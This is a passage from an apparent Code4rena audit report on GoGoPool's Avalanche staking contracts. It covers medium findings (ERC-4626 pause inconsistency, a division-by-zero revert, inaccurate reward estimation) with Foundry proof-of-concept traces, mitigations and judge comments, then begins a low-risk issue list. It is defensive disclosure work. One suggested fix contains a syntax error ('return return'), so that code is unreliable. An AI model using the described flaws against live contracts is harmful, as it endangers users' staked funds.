    console.log(staking.getMinipoolCount(nodeOp));
}
```

### Tools Used

VSCode

### Recommended Mitigation Steps

You need to simply add the line `staking.decreaseMinipoolCount(owner);` to the `MinipoolManager.recordStakingError` function.

**[0xju1ie (GoGoPool) confirmed](https://github.com/code-423n4/2022-12-gogopool-findings/issues/235)**

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/235#issuecomment-1410538395):**
 > The Warden has shown how, calling `recordStakingError` will not decrease the `minipoolCount`.
> 
> This will not only impact view functions but also impact Yield calculations.
> 
> For this reason, I agree with Medium Severity.

**[emersoncloud (GoGoPool) mitigated](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest#mitigations-to-be-reviewed):**
 > We removed minipool count entirely: [multisig-labs/gogopool#42](https://github.com/multisig-labs/gogopool/pull/42)

**Status:** Mitigation confirmed by [RaymondFam](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/59) and [hansfriese](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/44).



***

## [[M-20] TokenggAVAX: maxDeposit and maxMint return wrong value when contract is paused](https://github.com/code-423n4/2022-12-gogopool-findings/issues/144)
*Submitted by [HollaDieWaldfee](https://github.com/code-423n4/2022-12-gogopool-findings/issues/144), also found by [aviggiano](https://github.com/code-423n4/2022-12-gogopool-findings/issues/247)*

The `TokenggAVAX` contract (<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L24>) can be paused.

The `whenTokenNotPaused` modifier is applied to the following functions (<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L225-L239>):<br>
`previewDeposit`, `previewMint`, `previewWithdraw` and `previewRedeem`

Thereby any calls to functions that deposit or withdraw funds revert.

There are two functions (`maxWithdraw` and `maxRedeem`) that calculate the max amount that can be withdrawn or redeemed respectively.

Both functions return `0` if the `TokenggAVAX` contract is paused.

The issue is that `TokenggAVAX` does not override the `maxDeposit` and `maxMint` functions (<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L156-L162>) in the `ERC4626Upgradable` contract like it does for `maxWithdraw` and `maxRedeem`.

Thereby these two functions return a value that cannot actually be deposited or minted.

This can cause any components that rely on any of these functions to return a correct value to malfunction.

So `maxDeposit` and `maxMint` should return the value `0` when `TokenggAVAX` is paused.

### Proof of Concept

1.  The `TokenggAVAX` contract is paused by calling `Ocyticus.pauseEverything` (<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/Ocyticus.sol#L37-L43>)
2.  `TokenggAVAX.maxDeposit` returns `type(uint256).max` (<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L157>)
3.  However `deposit` cannot be called with this value because it is paused (`previewDeposit` reverts because of the `whenTokenNotPaused` modifier) (<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC4626Upgradeable.sol#L44>)

### Tools Used

VSCode

### Recommended Mitigation Steps

The `maxDeposit` and `maxMint` functions should be overridden by `TokenggAVAX` just like `maxWithdraw` and `maxRedeem` are overridden and return `0` when the contract is paused (<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L206-L223>).

So add these two functions to the `TokenggAVAX` contract:

```solidity
function maxDeposit(address) public view override returns (uint256) {
    if (getBool(keccak256(abi.encodePacked("contract.paused", "TokenggAVAX")))) {
        return 0;
    }
    return return type(uint256).max;
}

function maxMint(address) public view override returns (uint256) {
    if (getBool(keccak256(abi.encodePacked("contract.paused", "TokenggAVAX")))) {
        return 0;
    }
    return return type(uint256).max;
}
```

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/144#issuecomment-1372623332):**
 > Looks off, the modifiers will revert on pause, not return 0.

**[0xju1ie (GoGoPool) disagreed with severity and commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/144#issuecomment-1396711908):**
 > I'd say Low: `(e.g. assets are not at risk: state handling, function incorrect as to spec, issues with comments). Excludes Gas optimizations, which are submitted and judged separately.`

**[emersoncloud (GoGoPool) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/144#issuecomment-1396712353):**
 > Good catch, I think we should override those for consistency at least but there's no way to exploit to lose assets. Agreed that QA makes sense. 

**[Alex the Entreprenerd (judge) decreased severity to Low and commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/144#issuecomment-1410419042):**
 > By definition, the finding is Informational in Nature.
> 
> Because of the relevancy, I'm awarding it QA - Low

**[Alex the Entreprenerd (judge) increased severity to Medium and commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/144#issuecomment-1411061391):**
 > I had a change of heart on this issue, because this pertains to a standard that is being implemented.
> 
> For that reason am going to award Medium Severity, because the function breaks the standard, and historically we have awarded similar findings (e..g broken ERC20, broken ERC721 standard), with Medium.
> 
> The Warden has shown an inconsistency between the ERC-4626 Spec and the implementation done by the sponsor, while technically this is an informational finding, the fact that a standard was broken warrants a higher severity, leading me to believe that Medium is a more appropriate Severity.
> 
> Am making this decision because the Sponsor is following the standard, and the implementation of these functions is not consistent with it.

**[emersoncloud (GoGoPool) mitigated](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest#mitigations-to-be-reviewed):**
 > Return correct value from maxMint and maxDeposit when the contract is paused: [multisig-labs/gogopool#33](https://github.com/multisig-labs/gogopool/pull/33)

**Status:** Mitigation confirmed by [RaymondFam](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/60) and [hansfriese](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/45).



***

## [[M-21] Division by zero error can block `RewardsPool#startRewardCycle` if all multisig wallet are disabled](https://github.com/code-423n4/2022-12-gogopool-findings/issues/143)
*Submitted by [ladboy233](https://github.com/code-423n4/2022-12-gogopool-findings/issues/143), also found by [pauliax](undefined), [unforgiven](https://github.com/code-423n4/2022-12-gogopool-findings/issues/839), [\_\_141345\_\_](https://github.com/code-423n4/2022-12-gogopool-findings/issues/638), [peakbolt](https://github.com/code-423n4/2022-12-gogopool-findings/issues/599), and [rvierdiiev](https://github.com/code-423n4/2022-12-gogopool-findings/issues/240)*

<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/RewardsPool.sol#L229><br>
<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/RewardsPool.sol#L156>

A user needs to call the function startRewardsCycle in RewardsPool.sol

```solidity
/// @notice Public function that will run a GGP rewards cycle if possible
function startRewardsCycle() external {
```

which calls:

```solidity
uint256 multisigClaimContractAllotment = getClaimingContractDistribution("ClaimMultisig");
uint256 nopClaimContractAllotment = getClaimingContractDistribution("ClaimNodeOp");
uint256 daoClaimContractAllotment = getClaimingContractDistribution("ClaimProtocolDAO");
if (daoClaimContractAllotment + nopClaimContractAllotment + multisigClaimContractAllotment > getRewardsCycleTotalAmt()) {
	revert IncorrectRewardsDistribution();
}

TokenGGP ggp = TokenGGP(getContractAddress("TokenGGP"));
Vault vault = Vault(getContractAddress("Vault"));

if (daoClaimContractAllotment > 0) {
	emit ProtocolDAORewardsTransfered(daoClaimContractAllotment);
	vault.transferToken("ClaimProtocolDAO", ggp, daoClaimContractAllotment);
}

if (multisigClaimContractAllotment > 0) {
	emit MultisigRewardsTransfered(multisigClaimContractAllotment);
	distributeMultisigAllotment(multisigClaimContractAllotment, vault, ggp);
}

if (nopClaimContractAllotment > 0) {
	emit ClaimNodeOpRewardsTransfered(nopClaimContractAllotment);
	ClaimNodeOp nopClaim = ClaimNodeOp(getContractAddress("ClaimNodeOp"));
	nopClaim.setRewardsCycleTotal(nopClaimContractAllotment);
	vault.transferToken("ClaimNodeOp", ggp, nopClaimContractAllotment);
}
```

We need to pay special attention to the code block below:

```solidity
if (multisigClaimContractAllotment > 0) {
	emit MultisigRewardsTransfered(multisigClaimContractAllotment);
	distributeMultisigAllotment(multisigClaimContractAllotment, vault, ggp);
}
```

which calls:

```solidity
/// @notice Distributes GGP to enabled Multisigs
/// @param allotment Total GGP for Multisigs
/// @param vault Vault contract
/// @param ggp TokenGGP contract
function distributeMultisigAllotment(
uint256 allotment,
Vault vault,
TokenGGP ggp
) internal {
MultisigManager mm = MultisigManager(getContractAddress("MultisigManager"));

uint256 enabledCount;
uint256 count = mm.getCount();
address[] memory enabledMultisigs = new address[](count);

// there should never be more than a few multisigs, so a loop should be fine here
for (uint256 i = 0; i < count; i++) {
	(address addr, bool enabled) = mm.getMultisig(i);
	if (enabled) {
		enabledMultisigs[enabledCount] = addr;
		enabledCount++;
	}
}

// Dirty hack to cut unused elements off end of return value (from RP)
// solhint-disable-next-line no-inline-assembly
assembly {
	mstore(enabledMultisigs, enabledCount)
}

uint256 tokensPerMultisig = allotment / enabledCount;
for (uint256 i = 0; i < enabledMultisigs.length; i++) {
	vault.withdrawToken(enabledMultisigs[i], ggp, tokensPerMultisig);
}
}
```

The code distributes the reward to all multisig evenly.

```solidity
uint256 tokensPerMultisig = allotment / enabledCount;
```

However, if the enabledCount is 0, meaning no multisig wallet is enabled, the transactions revert in division by zero error and revert the startRewardsCycle transaction.

As shown in POC.

In RewardsPool.t.sol,

we change the name from testStartRewardsCycle to testStartRewardsCycle_POC

<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/test/unit/RewardsPool.t.sol#L123>

we add the code to disable all multisig wallet. before calling rewardsPool.startRewardsCycle

<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/test/unit/RewardsPool.t.sol#L138>

```solidity
// disable all multisg wallet
vm.prank(guardian);
ocyticus.disableAllMultisigs();
```

Then we run the test

```solidity
forge test -vvv --match testStartRewardsCycle_POC
```

the transaction revert in division by zero error, which block the startRewardsCycle

```solidity
    │   ├─ emit MultisigRewardsTransfered(value: 13499352589262561353689)
    │   ├─ [537] Storage::getAddress(0xcda836d09bcf3adcec2f52ddddeceac31738a574d5063511c887064e499593df) [staticcall]
    │   │   └─ ← MultisigManager: [0xA12E9172eB5A8B9054F897cC231Cd7a2751D6D93]
    │   ├─ [1313] MultisigManager::getCount() [staticcall]
    │   │   ├─ [549] Storage::getUint(0x778484468bc504108f077f6bf471293e4138c2d117c6f33607855518cf4bda79) [staticcall]
    │   │   │   └─ ← 1
    │   │   └─ ← 1
    │   ├─ [3050] MultisigManager::getMultisig(0) [staticcall]
    │   │   ├─ [537] Storage::getAddress(0xfebe6f39b65f18e050b53df1d0c8d45b8c5cce333324eb048b67b8ee5f26b7a3) [staticcall]
    │   │   │   └─ ← RialtoSimulator: [0x98D1613BC08756f51f46E841409E61C32f576F2f]
    │   │   ├─ [539] Storage::getBool(0x7ef800e7ca09c0c1063313b56290c06f6bc4bae0e9b7af3899bb7d5ade0403c8) [staticcall]
    │   │   │   └─ ← false
    │   │   └─ ← RialtoSimulator: [0x98D1613BC08756f51f46E841409E61C32f576F2f], false
    │   └─ ← "Division or modulo by 0"
    └─ ← "Division or modulo by 0"

Test result: FAILED. 0 passed; 1 failed; finished in 11.64ms

Failing tests:
Encountered 1 failing test in test/unit/RewardsPool.t.sol:RewardsPoolTest
[FAIL. Reason: Division or modulo by 0] testStartRewardsCycle_POC() (gas: 332890)
```

### Recommended Mitigation Steps

We recommend the project handle the case when the number of enabled multisig is 0 gracefully to not block the startRewardCycle transaction.

**[emersoncloud (GoGoPool) confirmed](https://github.com/code-423n4/2022-12-gogopool-findings/issues/143)**

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/143#issuecomment-1412623590):**
 > The Warden has shown a scenario that could cause the call to `startRewardsCycle` to revert.
> 
> When all multisigs are disabled (or no multisig is added), the division by zero will cause reverts.
> 
> While Admin Privilege is out of scope for this contest, the Warden has identified how a lack of zero-check can cause an open function to revert.
> 
> For this reason, I agree with Medium Severity.

**[emersoncloud (GoGoPool) mitigated](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest#mitigations-to-be-reviewed):**
 > Prevents division by zero error blocking startRewardCycle(): [multisig-labs/gogopool#37](https://github.com/multisig-labs/gogopool/pull/37)

**Status:** Mitigation confirmed, but a new medium severity issue was found. Full details in reports from [hansfriese](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/46) and [ladboy233](https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/8). Also included in Mitigation Review section below.



***

## [[M-22] Inaccurate estimation of validation rewards from function `ExpectedRewardAVA` in `MiniPoolManager.sol`](https://github.com/code-423n4/2022-12-gogopool-findings/issues/122)
*Submitted by [ladboy233](https://github.com/code-423n4/2022-12-gogopool-findings/issues/122), also found by [hansfriese](https://github.com/code-423n4/2022-12-gogopool-findings/issues/572)*

<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L560><br>
<https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L676>

The validation rewards can be inaccurately displayed to user and the slahsed amount can be wrong when slashing happens.

### Proof of Concept

Note the function below:

```solidity
	/// @notice Given a duration and an AVAX amt, calculate how much AVAX should be earned via validation rewards
	/// @param duration The length of validation in seconds
	/// @param avaxAmt The amount of AVAX the node staked for their validation period
	/// @return The approximate rewards the node should recieve from Avalanche for beign a validator
	function getExpectedAVAXRewardsAmt(uint256 duration, uint256 avaxAmt) public view returns (uint256) {
		ProtocolDAO dao = ProtocolDAO(getContractAddress("ProtocolDAO"));
		uint256 rate = dao.getExpectedAVAXRewardsRate();
		return (avaxAmt.mulWadDown(rate) * duration) / 365 days;
	}
```

As outlined in the comment section, the function is intended to  calculate how much AVAX should be earned via validation rewards.

Besides displaying the reward, this function is also used in the function slash.

```solidity
/// @notice Slashes the GPP of the minipool with the given index
/// @dev Extracted this because of "stack too deep" errors.
/// @param index Index of the minipool
function slash(int256 index) private {
	address nodeID = getAddress(keccak256(abi.encodePacked("minipool.item", index, ".nodeID")));
	address owner = getAddress(keccak256(abi.encodePacked("minipool.item", index, ".owner")));
	uint256 duration = getUint(keccak256(abi.encodePacked("minipool.item", index, ".duration")));
	uint256 avaxLiquidStakerAmt = getUint(keccak256(abi.encodePacked("minipool.item", index, ".avaxLiquidStakerAmt")));
	uint256 expectedAVAXRewardsAmt = getExpectedAVAXRewardsAmt(duration, avaxLiquidStakerAmt);
	uint256 slashGGPAmt = calculateGGPSlashAmt(expectedAVAXRewardsAmt);
	setUint(keccak256(abi.encodePacked("minipool.item", index, ".ggpSlashAmt")), slashGGPAmt);

	emit GGPSlashed(nodeID, slashGGPAmt);

	Staking staking = Staking(getContractAddress("Staking"));
	staking.slashGGP(owner, slashGGPAmt);
}
```

Note the code:

```solidity
uint256 expectedAVAXRewardsAmt = getExpectedAVAXRewardsAmt(duration, avaxLiquidStakerAmt);
uint256 slashGGPAmt = calculateGGPSlashAmt(expectedAVAXRewardsAmt);
```

The slashedGGPAmt is calculated based on the AVAX reward amount.

However, the estimation of the validation rewards is not accurate.

According to the doc:

<https://docs.avax.network/nodes/build/set-up-an-avalanche-node-with-microsoft-azure>

> Running a validator and staking with Avalanche provides extremely competitive rewards of between 9.69% and 11.54% depending on the length you stake for.

This implies that the staking length affect staking rewards, but this is kind of vague. What is the exact implementation of the reward calculation?

The implementation is linked below:

<https://github.com/ava-labs/avalanchego/blob/master/vms/platformvm/reward/calculator.go#L40>

```Golang
// Reward returns the amount of tokens to reward the staker with.
//
// RemainingSupply = SupplyCap - ExistingSupply
// PortionOfExistingSupply = StakedAmount / ExistingSupply
// PortionOfStakingDuration = StakingDuration / MaximumStakingDuration
// MintingRate = MinMintingRate + MaxSubMinMintingRate * PortionOfStakingDuration
// Reward = RemainingSupply * PortionOfExistingSupply * MintingRate * PortionOfStakingDuration
func (c *calculator) Calculate(stakedDuration time.Duration, stakedAmount, currentSupply uint64) uint64 {
	bigStakedDuration := new(big.Int).SetUint64(uint64(stakedDuration))
	bigStakedAmount := new(big.Int).SetUint64(stakedAmount)
	bigCurrentSupply := new(big.Int).SetUint64(currentSupply)

	adjustedConsumptionRateNumerator := new(big.Int).Mul(c.maxSubMinConsumptionRate, bigStakedDuration)
	adjustedMinConsumptionRateNumerator := new(big.Int).Mul(c.minConsumptionRate, c.mintingPeriod)
	adjustedConsumptionRateNumerator.Add(adjustedConsumptionRateNumerator, adjustedMinConsumptionRateNumerator)
	adjustedConsumptionRateDenominator := new(big.Int).Mul(c.mintingPeriod, consumptionRateDenominator)

	remainingSupply := c.supplyCap - currentSupply
	reward := new(big.Int).SetUint64(remainingSupply)
	reward.Mul(reward, adjustedConsumptionRateNumerator)
	reward.Mul(reward, bigStakedAmount)
	reward.Mul(reward, bigStakedDuration)
	reward.Div(reward, adjustedConsumptionRateDenominator)
	reward.Div(reward, bigCurrentSupply)
	reward.Div(reward, c.mintingPeriod)

	if !reward.IsUint64() {
		return remainingSupply
	}

	finalReward := reward.Uint64()
	if finalReward > remainingSupply {
		return remainingSupply
	}

	return finalReward
}
```

Note the reward calculation formula:

```solidity
// Reward returns the amount of tokens to reward the staker with.
//
// RemainingSupply = SupplyCap - ExistingSupply
// PortionOfExistingSupply = StakedAmount / ExistingSupply
// PortionOfStakingDuration = StakingDuration / MaximumStakingDuration
// MintingRate = MinMintingRate + MaxSubMinMintingRate * PortionOfStakingDuration
// Reward = RemainingSupply * PortionOfExistingSupply * MintingRate * PortionOfStakingDuration
```

However, in the current ExpectedRewardAVA, the implementation is just:

AVAX reward rate &ast; avax amount &ast; duration / 365 days.

```solidity
ProtocolDAO dao = ProtocolDAO(getContractAddress("ProtocolDAO"));
		uint256 rate = dao.getExpectedAVAXRewardsRate();
		return (avaxAmt.mulWadDown(rate) * duration) / 365 days;
```

Clearly, the implementation of the avalanche side is more sophisticated and accurate than the implemented ExpectedRewardAVA.

### Recommended Mitigation Steps

We recommend the project make the ExpectedRewardAVA implementation match the implement.

<https://github.com/ava-labs/avalanchego/blob/master/vms/platformvm/reward/calculator.go#L40>

**[0xju1ie (GoGoPool) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/122#issuecomment-1398876613):**
 > Rialto is going to report the correct rewards rate to the DAO from Avalanche. Not sure if it's a medium.

**[emersoncloud (GoGoPool) acknowledged and commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/122#issuecomment-1398893666):**
 > We felt comfortable with a static setting number because we are (initally) staking minipools for 2 week increments with 2000 AVAX, making the variability in rewards rates minimal. 
> 
> We will develop a more complex calculation as the protocol starts handling a wider range of funds and durations.

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/122#issuecomment-1414356992):**
 > The Warden has shown an incorrect implementation of the formula to estimate rewards.
> 
> The math would cause the slash value to be incorrect, causing improper yield to be distributed, for this reason I agree with Medium Severity.

**[emersoncloud (GoGoPool) commented](https://github.com/code-423n4/2022-12-gogopool-findings/issues/122#issuecomment-1421434941):**
 > Acknowledged. See comments above!



***

# Low Risk and Non-Critical Issues

For this contest, 15 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2022-12-gogopool-findings/issues/728) by **IllIllI** received the top score from the judge.

*The following wardens also submitted reports: [brgltd](https://github.com/code-423n4/2022-12-gogopool-findings/issues/876), [pauliax](https://github.com/code-423n4/2022-12-gogopool-findings/issues/854), [lukris02](https://github.com/code-423n4/2022-12-gogopool-findings/issues/791), [betweenETHlines](https://github.com/code-423n4/2022-12-gogopool-findings/issues/710), [sces60107](https://github.com/code-423n4/2022-12-gogopool-findings/issues/693), [AkshaySrivastav](https://github.com/code-423n4/2022-12-gogopool-findings/issues/565), [ast3ros](https://github.com/code-423n4/2022-12-gogopool-findings/issues/508), [0xSmartContract](https://github.com/code-423n4/2022-12-gogopool-findings/issues/392), [HollaDieWaldfee](https://github.com/code-423n4/2022-12-gogopool-findings/issues/338), [cozzetti](https://github.com/code-423n4/2022-12-gogopool-findings/issues/260), [Rolezn](https://github.com/code-423n4/2022-12-gogopool-findings/issues/94), [codeislight](https://github.com/code-423n4/2022-12-gogopool-findings/issues/78), [chaduke](https://github.com/code-423n4/2022-12-gogopool-findings/issues/74), and [RaymondFam](https://github.com/code-423n4/2022-12-gogopool-findings/issues/65).*

## Summary

### Low Risk Issues
| |Issue|Instances|
|-|:-|:-:|
| [L&#x2011;01] | Inflation not locked for four years | 1 | 
| [L&#x2011;02] | Contract will stop functioning in the year 2106 | 1 | 
| [L&#x2011;03] | Lower-level initializations should come first | 1 | 
| [L&#x2011;04] | Incorrect percentage conversion | 1 | 
| [L&#x2011;05] | Loss of precision | 2 | 
| [L&#x2011;06] | Signatures vulnerable to malleability attacks | 1 | 
| [L&#x2011;07] | `require()` should be used instead of `assert()` | 1 | 

Total: 8 instances over 7 issues

### Non-critical Issues
| |Issue|Instances|
|-|:-|:-:|
| [N&#x2011;01] | Common code should be refactored | 1 | 
| [N&#x2011;02] | String constants used in multiple places should be defined as constants | 1 | 
| [N&#x2011;03] | Constants in comparisons should appear on the left side | 1 | 
| [N&#x2011;04] | Inconsistent address separator in storage names | 1 | 
| [N&#x2011;05] | Confusing function name | 1 | 
| [N&#x2011;06] | Misplaced punctuation | 1 | 
| [N&#x2011;07] | Upgradeable contract is missing a `__gap[50]` storage variable to allow for new storage variables in later versions | 1 | 
| [N&#x2011;08] | Import declarations should import specific identifiers, rather than the whole file | 13 | 
| [N&#x2011;09] | Missing `initializer` modifier on constructor | 1 | 
| [N&#x2011;10] | The `nonReentrant` `modifier` should occur before all other modifiers | 2 | 
| [N&#x2011;11] | `override` function arguments that are unused should have the variable name removed or commented out to avoid compiler warnings | 1 | 
| [N&#x2011;12] | `constant`s should be defined rather than using magic numbers | 2 | 
| [N&#x2011;13] | Missing event and or timelock for critical parameter change | 1 | 
| [N&#x2011;14] | Events that mark critical parameter changes should contain both the old and the new value | 2 | 
| [N&#x2011;15] | Use a more recent version of solidity | 1 | 
| [N&#x2011;16] | Use a more recent version of solidity | 1 | 
| [N&#x2011;17] | Constant redefined elsewhere | 2 | 
| [N&#x2011;18] | Lines are too long | 1 | 
| [N&#x2011;19] | Variable names that consist of all capital letters should be reserved for `constant`/`immutable` variables | 2 | 
| [N&#x2011;20] | Using `>`/`>=` without specifying an upper bound is unsafe | 2 | 
| [N&#x2011;21] | Typos | 3 | 
| [N&#x2011;22] | File is missing NatSpec | 3 | 
| [N&#x2011;23] | NatSpec is incomplete | 27 | 
| [N&#x2011;24] | Not using the named return variables anywhere in the function is confusing | 1 | 
| [N&#x2011;25] | Contracts should have full test coverage | 1 | 
| [N&#x2011;26] | Large or complicated code bases should implement fuzzing tests | 1 | 
| [N&#x2011;27] | Function ordering does not follow the Solidity style guide | 15 | 
| [N&#x2011;28] | Contract does not follow the Solidity style guide's suggested layout ordering | 9 | 
| [N&#x2011;29] | Open TODOs | 1 | 

Total: 99 instances over 29 issues

## [L&#x2011;01] Inflation not locked for four years
The [litepaper](https://docs.gogopool.com/about-gogopool/gogopool-litepaper) says that there will be no inflation for four years, but there is no code enforcing this.

*There is 1 instance of this issue:*

```solidity
File: /contracts/contract/ProtocolDAO.sol

39   		// GGP Inflation
40   		setUint(keccak256("ProtocolDAO.InflationIntervalSeconds"), 1 days);
41:  		setUint(keccak256("ProtocolDAO.InflationIntervalRate"), 1000133680617113500); // 5% annual calculated on a daily interval - Calculate in js example: let dailyInflation = web3.utils.toBN((1 + 0.05) ** (1 / (365)) * 1e18);

```
https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ProtocolDAO.sol#L39-L41

## [L&#x2011;02] Contract will stop functioning in the year 2106
Limiting the timestamp to fit in a `uint32` will cause the call below to start reverting in 2106.

*There is 1 instance of this issue:*

```solidity
File: /contracts/contract/tokens/TokenggAVAX.sol

89:  		uint32 timestamp = block.timestamp.safeCastTo32();

```
https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L89

## [L&#x2011;03] Lower-level initializations should come first
There may not be an issue now, but if `ERC4626` changes to rely on some of the functions `BaseUpgradeable` provides, things will break.

*There is 1 instance of this issue:*

```solidity
File: /contracts/contract/tokens/TokenggAVAX.sol

72   	function initialize(Storage storageAddress, ERC20 asset) public initializer {
73   		__ERC4626Upgradeable_init(asset, "GoGoPool Liquid Staking Token", "ggAVAX");
74:  		__BaseUpgradeable_init(storageAddress);

```
https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L72-L74

## [L&#x2011;04] Incorrect percentage conversion
0.2 ether should be 20%, not 2%. [Other](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ProtocolDAO.sol#L44) areas use 0.X as X0%.

*There is 1 instance of this issue:*

```solidity
File: /contracts/contract/MinipoolManager.sol

194: 	/// @param delegationFee Percentage delegation fee in units of ether (2% is 0.2 ether)

```
https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L194

## [L&#x2011;05] Loss of precision
Division by large numbers may result in the result being zero, due to solidity not supporting fractions. Consider requiring a minimum amount for the numerator to ensure that it is always larger than the denominator.

*There are 2 instances of this issue:*

```solidity
File: contracts/contract/RewardsPool.sol

60:   		return (block.timestamp - startTime) / dao.getInflationIntervalSeconds();

128:  		return (block.timestamp - startTime) / dao.getRewardsCycleSeconds();

```
https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/RewardsPool.sol#L60

## [L&#x2011;06] Signatures vulnerable to malleability attacks
`ecrecover()` accepts as valid, two versions of signatures, meaning an attacker can use the same signature twice. Consider adding checks for signature malleability, or using OpenZeppelin's `ECDSA` library to perform the extra checks necessary in order to prevent this attack.

*There is 1 instance of this issue:*

```solidity
File: contracts/contract/tokens/upgradeable/ERC20Upgradeable.sol

132   			address recoveredAddress = ecrecover(
133   				keccak256(
134   					abi.encodePacked(
135   						"\x19\x01",
136   						DOMAIN_SEPARATOR(),
137   						keccak256(
138   							abi.encode(
139   								keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"),
140   								owner,
141   								spender,
142   								value,
143   								nonces[owner]++,
144   								deadline
145   							)
146   						)
147   					)
148   				),
149   				v,
150   				r,
151   				s
152:  			);

```
https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/upgradeable/ERC20Upgradeable.sol#L132-L152

## [L&#x2011;07] `require()` should be used instead of `assert()`
Prior to solidity version 0.8.0, hitting an assert consumes the **remainder of the transaction's available gas** rather than returning it, as `require()`/`revert()` do. `assert()` should be avoided even past solidity version 0.8.0 as its [documentation](https://docs.soliditylang.org/en/v0.8.14/control-structures.html#panic-via-assert-and-error-via-require) states that "The assert function creates an error of type Panic(uint256). ... Properly functioning code should never create a Panic, not even on invalid external input. If this happens, then there is a bug in your contract which you should fix".

*There is 1 instance of this issue:*

```solidity
File: contracts/contract/tokens/TokenggAVAX.sol

83:   		assert(msg.sender == address(asset));

```
https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/tokens/TokenggAVAX.sol#L83

## [N&#x2011;01] Common code should be refactored
[BaseAbstract](https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/BaseAbstract.sol#L71-L74) performs similar operations, so the common code should be refactored to a function

*There is 1 instance of this issue:*

```solidity
File: /contracts/contract/MultisigManager.sol

110: 		addr = getAddress(keccak256(abi.encodePacked("multisig.item", index, ".address")));

```
https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MultisigManager.sol#L110

## [N&#x2011;02] String constants used in multiple places should be defined as constants

*There is 1 instance of this issue:*

```solidity
File: /contracts/contract/MultisigManager.sol

110: 		addr = getAddress(keccak256(abi.encodePacked("multisig.item", index, ".address")));

```
https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MultisigManager.sol#L110

## [N&#x2011;03] Constants in comparisons should appear on the left side
Doing so will prevent [typo bugs](https://www.moserware.com/2008/01/constants-on-left-are-better-but-this.html).

*There is 1 instance of this issue:*

```solidity
File: /contracts/contract/ClaimNodeOp.sol

92:  		if (ggpRewards == 0) {

```
https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ClaimNodeOp.sol#L92

## [N&#x2011;04] Inconsistent address separator in storage names
Most addresses in storage names don't separate the prefix from the address with a period, but this one has one.

*There is 1 instance of this issue:*

```solidity
